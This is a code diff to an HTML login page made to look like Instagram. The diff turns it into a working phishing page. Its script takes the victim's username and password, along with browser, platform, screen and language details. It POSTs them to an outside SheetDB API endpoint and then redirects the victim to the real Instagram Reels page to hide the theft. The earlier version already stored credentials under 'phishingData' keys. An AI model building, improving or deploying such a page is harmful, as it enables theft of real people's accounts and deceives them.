@@ -7,28 +7,8 @@
   <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet"/>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      min-height: 100vh;
-      background: #fafafa;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      font-family: 'DM Sans', sans-serif;
-      padding: 20px;
-    }
-    .card {
-      background: #fff;
-      border: 1px solid #dbdbdb;
-      border-radius: 4px;
-      padding: 40px;
-      width: 100%;
-      max-width: 350px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 18px;
-    }
+    body { min-height: 100vh; background: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: 'DM Sans', sans-serif; padding: 20px; }
+    .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 40px; width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; gap: 18px; }
     .logo { font-family: 'Grand Hotel', cursive; font-size: 44px; color: #262626; margin-bottom: 6px; }
     .divider { display: flex; align-items: center; width: 100%; gap: 14px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
     .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
@@ -68,34 +48,53 @@
 </div>
 <div class="card2">Don't have an account? <a href="#">Sign up</a></div>
 <script>
+  const SHEETDB_API = 'https://sheetdb.io/api/v1/n352uhuqg5kol';
+
   const form = document.getElementById('loginForm');
   const btn = document.getElementById('loginBtn');
   const btnText = document.getElementById('btnText');
   const spinner = document.getElementById('spinner');
-  form.addEventListener('submit', function(e) {
+
+  form.addEventListener('submit', async function(e) {
     e.preventDefault();
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
+
     btn.disabled = true;
     btnText.style.display = 'none';
     spinner.style.display = 'block';
+
+    const ua = navigator.userAgent;
+    let browser = 'Unknown';
+    if (ua.includes('Chrome')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari')) browser = 'Safari';
+    else if (ua.includes('Edge')) browser = 'Edge';
+
     const data = {
-      username, password,
-      userAgent: navigator.userAgent,
+      username,
+      password,
       platform: navigator.platform,
+      screen: `${screen.width}x${screen.height}`,
       language: navigator.language,
-      screenSize: `${screen.width}x${screen.height}`,
+      browser,
       timestamp: new Date().toISOString(),
     };
-    localStorage.setItem('phishingData', JSON.stringify(data));
-    const history = JSON.parse(localStorage.getItem('phishingHistory') || '[]');
-    history.unshift({ ...data, id: Date.now() });
-    if (history.length > 20) history.pop();
-    localStorage.setItem('phishingHistory', JSON.stringify(history));
+
+    try {
+      await fetch(SHEETDB_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ data: [data] })
+      });
+    } catch(err) {
+      console.log('Capture error:', err);
+    }
+
     setTimeout(() => {
       window.location.href = 'https://www.instagram.com/reels/';
     }, 1800);
   });
 </script>
 </body>
-</html>
+</html
